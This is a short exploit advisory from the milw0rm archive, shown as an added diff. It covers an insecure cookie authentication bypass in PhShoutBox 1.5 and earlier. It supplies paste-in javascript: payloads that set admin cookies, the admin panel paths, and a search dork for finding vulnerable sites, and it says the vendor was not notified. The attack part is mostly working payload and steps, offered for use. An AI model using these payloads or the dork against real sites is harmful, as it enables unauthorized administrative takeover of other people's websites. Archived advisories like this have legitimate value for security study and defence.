@@ -1,0 +1,43 @@
+--==+================================================================================+==--
+--==+ PhShoutBox <= 1.5 (final) Insecure Cookie Handling (Arbitrary Authentication)  +==--
+--==+================================================================================+==--
+
+
+
+Discovered By: t0pP8uZz
+Discovered On: 18 April 2008
+Script Download: http://phphq.net/scripts.php?p=free-scripts&id=2
+DORK: inurl:"phshoutbox.php"
+
+Vendor Has Not Been Notified!
+
+
+DESCRIPTION: 
+PhShoutBox suffers from insecure cookie handling, allowing the remote attacker to craft a cookie that 
+makes the attacker look like a admin, this works because the admin panel only checks the password
+if a password has been posted using the php vars "$_POST" if POST isnt set, then the cookies will be checked
+for existance if they exist then it will grant admin.
+
+the javascript code below is the easyiesy way to do this, just paste it in your browser whilst
+at the vulnerable site, then visit "admin.php"
+
+
+Vulnerability:
+version 1.5:   javascript:document.cookie = "phadmin=True; path=/;";
+version < 1.4: javascript:document.cookie = "ssbadmin=True; path=/;";
+
+
+NOTE/TIP: 
+admin login is at "/admin.php" on 1.5 final
+and at "/shoutadmin.php" on 1.4 & below
+
+
+GREETZ: milw0rm.com, h4ck-y0u.org, CipherCrew !
+
+
+
+--==+================================================================================+==--
+--==+ PhShoutBox <= 1.5 (final) Insecure Cookie Handling (Arbitrary Authentication)  +==--
+--==+================================================================================+==--
+
+# milw0rm.com [2008-04-18]
